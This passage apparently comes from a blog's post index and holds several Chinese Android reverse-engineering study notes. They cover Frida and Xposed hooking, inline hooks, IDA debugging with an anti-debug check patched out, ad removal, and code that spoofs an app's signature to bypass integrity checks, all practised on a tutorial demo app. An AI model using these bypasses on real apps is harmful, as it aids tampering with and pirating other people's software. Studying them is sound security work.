在对复杂数据的处理上可以通过RPC传输给Python脚本来进行，有利于减少被注入进程的性能损耗 在大规模调用中更加普遍，特别是对于复杂数据处理的需求 注入模式与启动命令:\n注入模式 描述 命令或参数 优点 主要用途 Spawn模式 将启动App的权利交由Frida来控制，即使目标App已经启动，在使用Frida注入程序时还是会重新启动App 在CLI模式中，Frida通过加上 -f 参数指定包名以spawn模式操作App 适合于需要在App启动时即进行注入的场景，可以在App启动时即捕获其行为 当需要监控App从启动开始的所有行为时使用 Attach模式 在目标App已经启动的情况下，Frida通过ptrace注入程序从而执行Hook的操作 在CLI模式中，如果不添加 -f 参数，则默认会通过attach模式注入App 适合于已经运行的App，不会重新启动App，对用户体验影响较小 在App已经启动，或者我们只关心特定时刻或特定功能的行为时使用 Spawn模式\n1 frida -U -f 进程名 -l hook.js attach模式 ：\n1 frida -U 进程名 -l hook.js frida常用API\r​\t建议直接参考github文档，稍微了解一下即可，写脚本的时候直接使用gpt即可。\nObjection\r​\tobjection是基于frida的命令行hook集合工具, 可以让你不写代码, 敲几句命令就可以对java函数的高颗粒度hook, 还支持RPC调用。可以实现诸如内存搜索、类和模块搜索、方法hook打印参数返回值调用栈等常用功能，使用参考：frida进阶\nFrida-Native-Hook\rfrida_inlineHook\rInline hook（内联钩子）是一种在程序运行时修改函数执行流程的技术。它通过修改函数的原始代码，将目标函数的执行路径重定向到自定义的代码段，从而实现对目标函数的拦截和修改。 简单来说就是可以对任意地址的指令进行hook读写操作\ntrace工具\r工具名称 描述 链接 jnitrace 老牌，经典，信息全，携带方便 jnitrace jnitrace-engine 基于jnitrace，可定制化 jnitrace-engine jtrace 定制方便，信息全面，直接在_agent.js或者_agent_stable.js 里面加自己的逻辑就行 jtrace hook_art.js 可提供jni trace，可以灵活的增加你需要hook的函数 hook_art.js JNI-Frida-Hook 函数名已定义，方便定位 JNI-Frida-Hook findhash ida插件，可用于检测加解密函数，也可作为Native Trace库 findhash Stalker frida官方提供的代码跟踪引擎，可以在Native层方法级别，块级别，指令级别实现代码修改，代码跟踪 Stalker sktrace 类似 ida 指令 trace 功能 sktrace frida-qbdi-tracer 速度比frida stalker快，免补环境 frida-qbdi-tracer Frida各类hook方案学习\rxposed hook\r​\tXposed通过修改Art虚拟机，将需要hook的函数注册为Native函数，当执行这一函数时，虚拟机会优先执行Native函数，然后执行java函数，这样就成功完成了函数的hook。\n​\t主要的hook方式是通过编写Xposed模块，基本流程：\n(1)拷贝XposedBridgeApi.jar到新建工程的libs目录 (2)修改app目录下的build.gradle文件，在AndroidManifest.xml中增加Xposed相关内容 (3)新建hook类，编写hook代码 (4)新建assets文件夹，然后在assets目录下新建文件xposed_init,在里面写上hook类的完整路径\nFrida hook\r​\tFrida的原理同Xposed，修改Java method为native method。在ART和Dalivk中略有不同。\n​\t主要的hook方式是通过编写注入脚本或者集成objection工具\ninline hook\r​\tinline Hook是一种拦截目标函数调用的方法，主要用于杀毒软件、沙箱和恶意软件。一般的想法是将一个函数重定向到我们自己的函数，以便我们可以在函数执行它之前和/或之后执行处理；这可能包括：检查参数、填充、记录、欺骗返回的数据和过滤调用。\n​\thook是通过直接修改目标函数内的代码来放置，通常是用跳转覆盖的前几个字节，允许在函数进行任何处理之前重定向执行。\n​\tAndroid-lnline-Hook和SandHook都是基于inlinehook的两种开源框架。\nAndroid-lnline-Hook对一个目标so文件hook步骤如下：\n（1）我们获取so的handler，使用dlopen函数 void* libhandler = dlopen(\u0026ldquo;libc.so\u0026rdquo;,RTLD_NOW);\n（2）我们获取hook目标函数的地址,使用dlsym函数 void* strstr_addr = dlsym(libhandler,函数名); （3）声明原来的函数 void* (oldmethod)(char,char*); //这个格式需要参考hook的函数 声明现在的函数 void* newmethod(char* a,char* b){ return (void *)oldmethod(a,b); }\n（4）使用registerInlinehook进行重定向，将hook函数地址重定向我们编写的新函数上 (registerInlineHook((uint32_t) strstr_addr, (uint32_t) new_strstr, (uint32_t **) \u0026amp;old_strstr) != ELE7EN_OK //参数一：hook函数的地址 参数二：替换函数的地址 参数3：用来保存原来函数的地址\n（5）我们判断我们的hook操作是否成功,并且再次调用实现hook (inlineHook((uint32_t) strstr_addr) == ELE7EN_OK)\nSandHook使用姿势：\n（1）导包，将SandHook中cpp文件夹下的包全部导入到项目中，并修改CMakeLists.txt中添加native.cpp, 修改java层导入so库为sandHook-native （2）配置相关的环境 在配置文件build.gradle中配置 externalNativeBuild { cmake { arguments \u0026lsquo;-DBUILD_TESTING=OFF\u0026rsquo; cppFlags \u0026ldquo;-frtti -fexceptions -Wpointer-arith\u0026rdquo; abiFilters \u0026lsquo;armeabi-v7a\u0026rsquo;, \u0026lsquo;arm64-v8a\u0026rsquo; } }\n（3）编译可以成功通过 （4）使用 const char * libc = \u0026ldquo;/system/lib64/libc.so\u0026rdquo;; old_fopen = reinterpret_cast\u0026lt;void ()(char *, char *)\u0026gt;(SandInlineHookSym(libc, \u0026ldquo;fopen\u0026rdquo;, reinterpret_cast\u0026lt;void *\u0026gt;(new_fopen))); 参数2：hook的函数 参数3：新的函数\n添加原理hook旧函数的声明 void* (old_fopen)(char,char*); 实现新的函数功能 void* new_fopen(char* a,char* b){ __android_log_print(6,\u0026ldquo;windaa\u0026rdquo;,\u0026ldquo;I am from new open %s\u0026rdquo;,a); return old_fopen(a,b); }\n（5）运行测试是否成功启动\nunicorn hook\r​\tunidbg\n原帖\rhttps://www.52pojie.cn/thread-1823118-1-1.html\nhttps://bbs.kanxue.com/thread-272870-1.htm\n","date":"2024-11-08T14:28:29+08:00","permalink":"https://zhu1ang.github.io/p/52study_9/","title":"安卓逆向入门（九）"},{"content":"so加载流程\r反调试、脱壳、注入等\n涉及到的函数介绍：\n函数名 描述 android_dlopen_ext() 、dlopen()、do_dlopen() 这三个函数主要用于加载库文件。android_dlopen_ext 是系统的一个函数，用于在运行时动态加载共享库。与标准的 dlopen() 函数相比，android_dlopen_ext 提供了更多的参数选项和扩展功能，例如支持命名空间、符号版本等特性。 find_library() find_library() 函数用于查找库，基本的用途是给定一个库的名字，然后查找并返回这个库的路径。 call_constructors() call_constructors() 是用于调用动态加载库中的构造函数的函数。 init 库的构造函数，用于初始化库中的静态变量或执行其他需要在库被加载时完成的任务。如果没有定义init函数，系统将不会执行任何动作。需要注意的是，init函数不应该有任何参数，并且也没有返回值。 init_array init_array是ELF（Executable and Linkable Format，可执行和可链接格式）二进制格式中的一个特殊段（section），这个段包含了一些函数的指针，这些函数将在main()函数执行前被调用，用于初始化静态局部变量和全局变量。 jni_onload 这是Android JNI(Java Native Interface)中的一个函数。当一个native库被系统加载时，该函数会被自动调用。JNI_OnLoad可以做一些初始化工作，例如注册你的native方法或者初始化一些数据结构。如果你的native库没有定义这个函数，那么JNI会使用默认的行为。JNI_OnLoad的返回值应该是需要的JNI版本，一般返回JNI_VERSION_1_6。 下断点时机： 应用级别的：java_com_XXX； 外壳级别的：JNI_Onload，.init，.init_array(反调试); 系统级别的：fopen，fget，dvmdexfileopen(脱壳)；\nIDA动态调试\r1.前置操作：\n1.在IDA目录下的dbgsrv，选择跟手机架构一致的server 2.adb push as /data/local/tmp/ 3.进入手机端命令：adb shell 4.切换获取手机的root权限：su 5.跳到对应路径：cd /data/local/tmp/ 6.提权：chmod 777 as 7.XappDebug hook\n2.调试步骤\n分为两种模式，一种是以debug模式启动，第二种则以普通模式启动，二者的区别在于使用场景，有时候要动态调试的参数在app一启动的时候就产生了，时机较早，所以需要以debug模式去挂起app\n1 2 3 4 adb shell am start -D -n com.zj.wuaipojie/.ui.ChallengeEight （去掉-D 则表示不以debug模式启动app） adb forward tcp:23946 tcp:23946 (端口转发) adb forward tcp:8700 jdwp:PID (pid监听) jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700 (jdb挂起) 3.实例操作\n根据错误提示定位到check函数，把加载的so文件拉出来，使用IDA查看\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 jint JNI_OnLoad(JavaVM *vm, void *reserved) { __int64 v4; // x0 _QWORD v5[2]; // [xsp+0h] [xbp-30h] BYREF v5[1] = *(_QWORD *)(_ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2)) + 40); if ( ptrace(PTRACE_TRACEME, 0LL, 1LL, 0LL) == -1 ) _exit(0); __android_log_print(4, \u0026#34;NativeHookIO\u0026#34;, \u0026#34;i am JNI_OnLoad\u0026#34;); v5[0] = 0LL; if ( (*vm)-\u0026gt;GetEnv(vm, (void **)v5, 65542LL) ) return -1; v4 = (*(__int64 (__fastcall **)(_QWORD, const char *))(*(_QWORD *)v5[0] + 48LL))( v5[0], \u0026#34;com/zj/wuaipojie/util/SecurityUtil\u0026#34;); if ( !v4 ) return -1; if ( (*(int (__fastcall **)(_QWORD, __int64, char **, __int64))(*(_QWORD *)v5[0] + 1720LL))(v5[0], v4, methods, 1LL) \u0026lt; 0 ) return -1; return 65542; } JNI_OnLoad方法里面可能会有反调试的函数，将强制跳转到校验处patch为NOP，忽略校验。\n然后使用更新后的so文件替换掉apk中原来的so，开始调试\n注：使用IDA 9 Pro 的android_server64的话会一直报错\n运行到断点的时候，再单步运行到比较这里，就可以得到正确密码\nso防护手段之ollvm\r常见防护手段:\n主要功能 描述 SO加壳 对C/C++源码编译出来的SO文件进行加壳，使SO文件无法正确反编译和反汇编。 SO源码虚拟化保护 将原始汇编指令翻译为自定义的虚拟机指令，跳转到自定义的虚拟机中执行，每次保护生成的虚拟机指令随机，且对虚拟机解释器再度混淆 SO防调用 对SO文件进行授权绑定，防止SO文件被非授权应用调用运行。 SO Linker 对整个SO文件进行加密压缩，包括代码段、符号表和字符串等，运行时再解密解压缩到内存，从而有效的防止SO数据的泄露。 SO源码混淆 常量字符串加密、分裂基本块、等价指令替换、虚假控制流、控制流平坦化。 SO环境监测 防frida\\xposed\\root、防动态调试、防模拟器、防多开等 ollvm的分类：\n分类 描述 指令替换（Instructions Substitution)(Sub) 将一条运算指令替换为多条等价的运算指令，例如：y=x+1变为y=x+1+1-1 虚假控制流（Bogus Control Flow)(bcf) 通过加入包含不透明谓词的条件跳转和不可达的基本块，来干扰IDA的控制流分析和F5反汇编 控制流平坦化(Control Flow Flattening)(Fla) 主要通过一个主分发器来控制程序基本块的执行流程，将所有基本代码放到控制流最底部，然后删除原理基本块之间跳转关系，添加次分发器来控制分发逻辑，然后过新的复杂分发逻辑还原原来程序块之间的逻辑关系 字符串加密 编写一个pass将其中的字符串信息使用一些加密算法进行加密，然后特定的时间进行还原 ollvm的对抗：\n1.简单ollvm可以通过交叉引用分析 2.angr去除不透明谓词 3.Unicorn/Unidbg/AndroidNativeEmu模拟执行 4.IDA Trace 5.binary ninja 6.后端编译优化 7.frida辅助分析\n原帖\rhttps://www.52pojie.cn/thread-1809646-1-1.html\n","date":"2024-10-29T13:50:05+08:00","permalink":"https://zhu1ang.github.io/p/52study_8/","title":"安卓逆向入门（八）"},{"content":"密码学基础\r明文：原始消息 密文：加密后的消息 加密：从明文到密文的变换过程 解密：从密文到明文的变换过程 密钥：相用来完成加解密等过程的秘密信息 对称加密\rAES加密和解密使用的是相同的密钥\n非对称加密\rRSA发送方使用公钥进行加密，接收方使用私钥进行解密（每次加密得到的密文不同）\nDH密钥交换双方协商相同的算法参数，使用各自的私钥加密后生成公钥进行交换，再把交换后的使用自己的私钥处理得到相同的密钥。\nHash\r哈希算法是一种将任意长度的输入（如文本、文件等）通过算法转换为固定长度的输出（称为哈希值或摘要）的函数。这个过程是不可逆的，即无法通过哈希值还原出原始数据。常见的哈希算法包括 MD5、SHA-1、SHA-256 等。\n特点：高敏感性（一个字符的变化都会导致hash值巨大变化）、抗碰撞性（不同的输入尽量不会产生相同的hash值）\n消息认证码（MAC）\r在单向散列函数的基础上，增添共享密钥进行认证，但是这个密钥会存在分发问题。\n数字证书CA\r为了确认公钥持有者的身份，让一个可信的第三方来对公钥进行签名，这个可信的第三方，称之为Certificate authorities（CA）。\n参考以及拓展阅读：TLS协议\n常见编码\rBase64编码\rBase64是一种用64个字符表示任意二进制数据的方法，是一种编码，并非加密字符编码，由 A-Z a-z 0-9 + / 和补充字符 “=” 组成，Base64编码后的字符数是4的倍数（不足会补\u0026quot;=\u0026quot;）\nHex编码\rhex编码，又称十六进制编码(也称base16)，一般用于方便人们查看二进制文件内容，它将字节数据中的每4个bit使用数字(0-9)、字母(A-F)共16个字符等效表示，由于一个字节有8个bit，所以一个字节会被编码为2个hex字符 PS:在 ASCII 编码中，只有0到127之间的数字是表示英文字母、数字和符号的，超出这个范围的字符需要使用其他编码方式,例如汉字就需要使用 UTF-8 或 UTF-16\nUnicode编码\rUnicode 是一种字符编码标准，旨在为世界上所有的文字、符号和表情符号分配唯一的编码，以解决不同语言和字符集之间的不兼容问题。Unicode 编码目前广泛用于互联网、操作系统、编程语言和数据库系统。\n非标准加密对抗\r主动调用 补全代码还原算法（Chatgpt发力区间） 课后作业\r修改教程demo中的值\n思路：jadx定位，xposed模块编写hook去修改\n","date":"2024-10-24T10:14:13+08:00","permalink":"https://zhu1ang.github.io/p/52study_7/","title":"安卓逆向入门（七）"},{"content":"Xposed介绍\rXposed框架原理是部署在ROOT后的安卓手机上，通过替换/system/bin/app_process程序控制zygote进程，使得app_process在启动过程中会加载XposedBridge.jar，从而完成对Zygote进程及其创建的Dalvik虚拟机的劫持。可以让我们在不修改APK源码的情况下，通过自己编写的模块来影响程序运行的框架服务，实现类似于自动抢红包、微信消息自动回复等功能。 根据官方tutorial，典型的插件开发流程分为：\n1 2 3 4 加入Xposed Framework API 修改AndroidManifest.xml 编写hook代码 将类注册到assets/xposed_init文件中去 Xposed模块编写\r1.Android Studio创建新项目 2.将下载的xposedBridgeApi.jar包拖进libs文件夹 3.右击jar包，选择add as library 4.修改xml文件配置\n注意：这里可能会因为最开始配置Android studio的时候未设置正确的代理导致build失败，参考：掘金文章\n再将下载的xposedBridgeApi.jar包拖进libs文件夹，右击jar包，选择add as library等待完成后，然后在app/src/main/res/Android Manifest.xml里添加如下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;!-- 是否是xposed模块，xposed根据这个来判断是否是模块 --\u0026gt; \u0026lt;meta-data android:name=\u0026#34;xposedmodule\u0026#34; android:value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;!-- 模块描述，显示在xposed模块列表那里第二行 --\u0026gt; \u0026lt;meta-data android:name=\u0026#34;xposeddescription\u0026#34; android:value=\u0026#34;这是一个Xposed模块\u0026#34; /\u0026gt; \u0026lt;!-- 最低xposed版本号(lib文件名可知) --\u0026gt; \u0026lt;meta-data android:name=\u0026#34;xposedminversion\u0026#34; android:value=\u0026#34;89\u0026#34; /\u0026gt; Android手机连接Android studio后点击运行，即可在Android上成功安装app并且LSPosed模块里也能看到新建的模块\n5.修改build.gradle,将此处修改为compileOnly 默认的是implementation\n6.新建\u0026ndash;\u0026gt;Folder\u0026ndash;\u0026gt;Assets Folder，创建xposed_init(不要后缀名):只有一行代码，就是说明入口类 7.新建Hook类，实现IXposedHookLoadPackage接口，然后在handleLoadPackage函数内编写Hook逻辑\nXposed API\r以hook普通方法为例子，首先使用Logcat捕获日志，并且打开教程demo，过滤出第七关的日志输出\n使用jadx打开demo.apk，查看demo类，找到需要hook的代码，复制为xposed代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 XposedHelpers.findAndHookMethod(\u0026#34;com.zj.wuaipojie.Demo\u0026#34;, loadPackageParam.classLoader, \u0026#34;a\u0026#34;, String.class, new XC_MethodHook() { @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable { super.beforeHookedMethod(param); XposedBridge.log(param.args[0].toString()); String a = \u0026#34;changed method\u0026#34;; param.args[0] = a; XposedBridge.log(param.args[0].toString()); } @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable { super.afterHookedMethod(param); } }); 复制到hook类里，并且进行参数的修改。\n然后重新运行，并且在LSposed里启用编写的模块并且勾选教程demo，重新捕获日志，可以看到，已经成功修改了参数。\n","date":"2024-10-17T15:31:16+08:00","permalink":"https://zhu1ang.github.io/p/52study_6/","title":"安卓逆向入门（六）"},{"content":"APK签名校验\r通过对 Apk 进行签名，开发者可以证明对 Apk 的所有权和控制权，可用于安装和更新其应用。而在 Android 设备上的安装 Apk ，如果是一个没有被签名的 Apk，则会被拒绝安装。在安装 Apk 的时候，软件包管理器也会验证 Apk 是否已经被正确签名，并且通过签名证书和数据摘要验证是否合法没有被篡改。只有确认安全无篡改的情况下，才允许安装在设备上。\n简单来说，APK 的签名主要作用有两个：\n证明 APK 的所有者。 允许 Android 市场和设备校验 APK 的正确性。 Android 目前支持以下四种应用签名方案： v1 方案：基于 JAR 签名。 v2 方案：APK 签名方案 v2（在 Android 7.0 中引入） v3 方案：APK 签名方案 v3（在 Android 9 中引入） v4 方案：APK 签名方案 v4（在 Android 11 中引入）\nV1 签名的机制主要就在 META-INF 目录下的三个文件，MANIFEST.MF，ANDROID.SF，ANDROID.RSA，他们都是 V1 签名的产物。 （1）MANIFEST.MF：这是摘要文件。程序遍历Apk包中的所有文件(entry)，对非文件夹非签名文件的文件，逐个用SHA1(安全哈希算法)生成摘要信息，再用Base64进行编码。如果你改变了apk包中的文件，那么在apk安装校验时，改变后的文件摘要信息与MANIFEST.MF的检验信息不同，于是程序就不能成功安装。\n（2）ANDROID.SF：这是对摘要的签名文件。对前一步生成的MANIFEST.MF，使用SHA1-RSA算法，用开发者的私钥进行签名。在安装时只能使用公钥才能解密它。解密之后，将它与未加密的摘要信息（即，MANIFEST.MF文件）进行对比，如果相符，则表明内容没有被异常修改。\n（3）ANDROID.RSA文件中保存了公钥、所采用的加密算法等信息。\n签名校验对抗\r方法一:核心破解插件，不签名安装应用 方法二:一键过签名工具，例如MT、NP、ARMPro、CNFIX、Modex的去除签名校验功能 方法三:具体分析签名校验逻辑(手撕签名校验) 方法四:io重定向\u0026ndash;VA\u0026amp;SVC：ptrace+seccomp\n手动实现PM代理\rHOOK PMS\n有一些过时，源码可以看一下，使用也可以了解了解\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 package com.zj.hookpms; import java.lang.reflect.Field; import java.lang.reflect.Method; import java.lang.reflect.Proxy; import android.content.Context; import android.content.pm.PackageManager; import android.util.Log; public class ServiceManagerWraper { public final static String ZJ = \u0026#34;ZJ595\u0026#34;; public static void hookPMS(Context context, String signed, String appPkgName, int hashCode) { try { // 获取全局的ActivityThread对象 Class\u0026lt;?\u0026gt; activityThreadClass = Class.forName(\u0026#34;android.app.ActivityThread\u0026#34;); Method currentActivityThreadMethod = activityThreadClass.getDeclaredMethod(\u0026#34;currentActivityThread\u0026#34;); Object currentActivityThread = currentActivityThreadMethod.invoke(null); // 获取ActivityThread里面原始的sPackageManager Field sPackageManagerField = activityThreadClass.getDeclaredField(\u0026#34;sPackageManager\u0026#34;); sPackageManagerField.setAccessible(true); Object sPackageManager = sPackageManagerField.get(currentActivityThread); // 准备好代{过}{滤}理对象, 用来替换原始的对象 Class\u0026lt;?\u0026gt; iPackageManagerInterface = Class.forName(\u0026#34;android.content.pm.IPackageManager\u0026#34;); Object proxy = Proxy.newProxyInstance( iPackageManagerInterface.getClassLoader(), new Class\u0026lt;?\u0026gt;[]{iPackageManagerInterface}, new PmsHookBinderInvocationHandler(sPackageManager, signed, appPkgName, 0)); // 1. 替换掉ActivityThread里面的 sPackageManager 字段 sPackageManagerField.set(currentActivityThread, proxy); // 2. 替换 ApplicationPackageManager里面的 mPM对象 PackageManager pm = context.getPackageManager(); Field mPmField = pm.getClass().getDeclaredField(\u0026#34;mPM\u0026#34;); mPmField.setAccessible(true); mPmField.set(pm, proxy); } catch (Exception e) { Log.d(ZJ, \u0026#34;hook pms error:\u0026#34; + Log.getStackTraceString(e)); } } public static void hookPMS(Context context) { String Sign = \u0026#34;原包的签名信息\u0026#34;; hookPMS(context, Sign, \u0026#34;com.zj.hookpms\u0026#34;, 0); } } IO重定向\rIO重定向可以干嘛？\n1，可以让文件只读，不可写\n2，禁止访问文件\n3，路径替换\n具体实现： 过签名检测(读取原包) 风控对抗(例:一个文件记录App启动的次数) 过Root检测，Xposed检测(文件不可取)\n普通签名校验\r在jadx里定位到校验的代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 private final boolean checkSign(Context context) { try { for (Signature signature : context.getPackageManager().getPackageInfo(context.getPackageName(), 64).signatures) { MessageDigest messageDigest = MessageDigest.getInstance(\u0026#34;SHA\u0026#34;); messageDigest.update(signature.toByteArray()); String encodeToString = Base64Utils.INSTANCE.encodeToString(messageDigest.digest()); Log.e(\u0026#34;zj2595\u0026#34;, \u0026#34;sign:\u0026#34; + encodeToString); if (!Intrinsics.areEqual(this.SIGNATURE, encodeToString)) { return false; } } return true; } catch (Exception e) { e.printStackTrace(); return true; } } 1 private final String SIGNATURE = \u0026#34;h99Ici0iopj8tC6NkfqyJgs73ss=\u0026#34;; 使用MT管理器在classdex文件中定位到相关校验的位置，使用算法助手输出日志，在日志中可以查看到修改之后的签名校验，进行替换。新的API签名校验也可这样绕过。\nCRC校验\r1 2 3 4 5 6 7 sget-object p10, Lcom/zj/wuaipojie/util/ContextUtils;-\u0026gt;INSTANCE:Lcom/zj/wuaipojie/util/ContextUtils; invoke-virtual {p10}, Lcom/zj/wuaipojie/util/ContextUtils;-\u0026gt;getContext()Landroid/content/Context; move-result-object p10 invoke-static {p10}, Lcom/zj/wuaipojie/util/SecurityUtil;-\u0026gt;hook(Landroid/content/Context;)V 调用教程作者已经写好的方法（在checkcrc方法被调用之前进行调用），使得进行crc校验以及hash校验的时候重定向到未修改的包。\nhook open、openat等读取文件的底层函数\n其他校验\rroot检测\n反制手段 1.算法助手、对话框取消等插件一键hook 2.分析具体的检测代码 3.利用IO重定向使文件不可读 4.修改Andoird源码，去除常见指纹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 fun isDeviceRooted(): Boolean { return checkRootMethod1() || checkRootMethod2() || checkRootMethod3() } fun checkRootMethod1(): Boolean { val buildTags = android.os.Build.TAGS return buildTags != null \u0026amp;\u0026amp; buildTags.contains(\u0026#34;test-keys\u0026#34;) } fun checkRootMethod2(): Boolean { val paths = arrayOf(\u0026#34;/system/app/Superuser.apk\u0026#34;, \u0026#34;/sbin/su\u0026#34;, \u0026#34;/system/bin/su\u0026#34;, \u0026#34;/system/xbin/su\u0026#34;, \u0026#34;/data/local/xbin/su\u0026#34;, \u0026#34;/data/local/bin/su\u0026#34;, \u0026#34;/system/sd/xbin/su\u0026#34;, \u0026#34;/system/bin/failsafe/su\u0026#34;, \u0026#34;/data/local/su\u0026#34;, \u0026#34;/su/bin/su\u0026#34;) for (path in paths) { if (File(path).exists()) return true } return false } fun checkRootMethod3(): Boolean { var process: Process? = null return try { process = Runtime.getRuntime().exec(arrayOf(\u0026#34;/system/xbin/which\u0026#34;, \u0026#34;su\u0026#34;)) val bufferedReader = BufferedReader(InputStreamReader(process.inputStream)) bufferedReader.readLine() != null } catch (t: Throwable) { false } finally { process?.destroy() } } 模拟器检测\n通过检测系统的 Build 对象来判断当前设备是否为模拟器。具体方法是检测 Build.FINGERPRINT 属性是否包含字符串 \u0026quot;generic\u0026quot;。\n反调试检测\n链接\nsmali赋值\rint型\nconst/4 最大只允许存放4个二进制位(4bit)， const/16 最大值允许存放16个二进制位(16bit)， 第一位(即最高位)默认为符号位。\nlong型\nonst-wide vx, lit32 表示将一个 32 位的常量存储到 vx 与 vx+1 两个寄存器中 —— 即一个 long 类型的数据\n变量赋值\n","date":"2024-10-14T14:42:45+08:00","permalink":"https://zhu1ang.github.io/p/52study_5/","title":"安卓逆向入门（五）"},{"content":"动态调试\r修改权限\r方法一:在AndroidManifest.xml里添加可调试权限\n1 android:debuggable=\u0026#34;true\u0026#34; 方法二：XappDebug模块hook对应的ap\n方法三：Magisk命令(重启失效)\n1 2 3 4 adb shell #adb进入命令行模式 su #切换至超级用户 magisk resetprop ro.debuggable 1 stop;start; #一定要通过该方式重启 方法四:刷入MagiskHide Props Config模块\n可以参考：MagiskHidePropsConf开启全局调试\n下断点\r根据提示，在jeb里进行字符串搜索，定位进行密钥判断的代码\n分析逻辑后，在check函数的返回值一行下断点\ndebug模式启动\r1 adb shell am start -D -n com.zj.wuaipojie/.ui.MainActivity adb shell am start -D -n 包名/类名\n然后在jeb里面进行调试器attcah\n在教程demo里再次输入密钥，断下来之后可以直接next然后查看check函数的返回值，也就是密钥。\n但是这里我在jeb里无法看到变量值，而且运行调试会卡死再断掉，故使用frida进行hook查看\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 Java.perform(function () { // 获取目标类 var Encode = Java.use(\u0026#39;com.zj.wuaipojie.Encode\u0026#39;); var Base64Utils = Java.use(\u0026#39;com.zj.wuaipojie.util.Base64Utils\u0026#39;); // Hook Encode.encode 方法 Encode.encode.implementation = function (input) { console.log(\u0026#39;Encode.encode 被调用，输入: \u0026#39; + input); // 调用原始方法 var result = this.encode(input); console.log(\u0026#39;Encode.encode 输出: \u0026#39; + result); return result; }; // Hook Base64Utils.encodeToString 方法 Base64Utils.encodeToString.overload(\u0026#39;[B\u0026#39;).implementation = function (bytes) { // 打印 bytes 内容 console.log(\u0026#39;bytes content:\u0026#39;); // 转换 bytes 为十六进制字符串 var hexString = \u0026#39;\u0026#39;; for (var i = 0; i \u0026lt; bytes.length; i++) { hexString += (\u0026#39;0\u0026#39; + (bytes[i] \u0026amp; 0xff).toString(16)).slice(-2) + \u0026#39; \u0026#39;; } console.log(hexString.trim()); // 调用原始方法获取 Base64 编码结果 var base64String = this.encodeToString(bytes); // 打印 Base64 编码结果 console.log(\u0026#39;Base64 编码结果: \u0026#39; + base64String); // 返回原始 Base64 编码结果 return base64String; }; }); log插桩\rLog插桩指的是反编译APK文件时，在对应的smali文件里，添加相应的smali代码，将程序中的关键信息，以log日志的形式进行输出。\n1 invoke-static {对应寄存器}, Lcom/mtools/LogUtils;-\u0026gt;v(Ljava/lang/Object;)V ","date":"2024-09-26T13:57:41+08:00","permalink":"https://zhu1ang.github.io/p/52study_4/","title":"安卓逆向入门（四）"},{"content":"去广告\r广告类型：启动广告、更新广告、横幅广告等\n启动广告流程：启动Activity——广告Activity——主页Activity\n修改方法：\n修改加载时间 Activity切换定位 修改加载时间\r首先使用MT管理器的Activity记录功能，找到广告Activity的类名，然后通过搜索这个类名，定位到加载广告的代码段。\n通过java代码理清逻辑找到要修改的加载时间， 然后在smali代码相应的位置进行修改，重新安装后可以看到，仍然是加载了Ad这个广告类，但是时间很短，所以看起来是直接进入了挑战界面。\nActivity切换\r通过搜索广告类的smali的类名，从而找到真正调用这个类创建实例的地方，可以从这里的代码看到，ChallengeSecond和ChallengeForth之间是AdActivity，那么把这里修改成ChallengeThird即可（修改smali代码）\n而且这种方法不用再加载Ad那个广告类\nActivity生命周期\r弹窗定位\u0026amp;堆栈分析\r修改方法： 1.修改xml中的versiocode 2.Hook弹窗(推荐算法助手开启弹窗定位) 3.修改dex弹窗代码 4.抓包修改响应体(也可以路由器拦截)\n算法助手hook，通过定位弹窗功能可以使用返回键取消弹窗，屏蔽关键词弹窗可以直接将弹窗屏蔽，转到ChallengeThird Activity。\n通过算法助手的日志可以查看到广告弹窗的堆栈调用，然后可以在MT管理器去搜索\n这里将一号广告弹窗的show方法注释掉之后，再打开直接会弹出二号广告弹窗。\n开发者助手抓布局\r通过开发助手抓取横幅广告的布局，然后通过xml搜索定位到位置，通过修改布局宽度和高度都为0或者直接使用android:visibility=\u0026quot;gone\u0026quot;来隐藏广告布局。\n两种方法都是有效。\n其他\r在做作业demo的时候无意中打开NP管理器，突然发现NP管理器会一直弹更新广告，学以致用发现，利用好算法助手的定位功能确实可以去掉更新广告。\n","date":"2024-09-15T21:07:19+08:00","permalink":"https://zhu1ang.github.io/p/52study_3/","title":"安卓逆向入门（三）"},{"content":"smali及其语法\r​\tsmali是由dex反编译得到的，不能直接修改java代码，而是修改smali代码。\n关键字\n.class 类名 .super 父类名，继承的上级类名名称 .source 源名 .field 变量 .method 方法名 .register 寄存器 .end method 方法名的结束 public 公有 protected 半公开，只有同一家人才能用 private 私有，只能自己使用 .parameter 方法参数 .prologue 方法开始 .line xxx 位于第xxx行 数据类型对应\nV void 无返回值 Z boolean 布尔值类型，返回0或1 B byte 字节类型，返回字节 S short 短整数类型，返回数字 C char 字符类型，返回字符 I int 整数类型，返回数字 J long （64位 需要2个寄存器存储） 长整数类型，返回数字 F float 单浮点类型，返回数字 D double （64位 需要2个寄存器存储） 双浮点类型，返回数字 string String 文本类型，返回字符串 Lxxx/xxx/xxx object 对象类型，返回对象 常用指令\nconst 重写整数属性，真假属性内容，只能是数字类型 const-string 重写字符串内容 const-wide 重写长整数类型，多用于修改到期时间。 return 返回指令 if-eq 全称equal(a=b)，比较寄存器ab内容，相同则跳 if-ne 全称not equal(a!=b)，ab内容不相同则跳 if-eqz 全称equal zero(a=0)，z即是0的标记，a等于0则跳 if-nez 全称not equal zero(a!=0)，a不等于0则跳 if-ge 全称greater equal(a\u0026gt;=b)，a大于或等于则跳 if-le 全称little equal(a\u0026lt;=b)，a小于或等于则跳 goto 强制跳到指定位置 switch 分支跳转，一般会有多个分支线，并根据指令跳转到适当位置 iget 获取寄存器数据 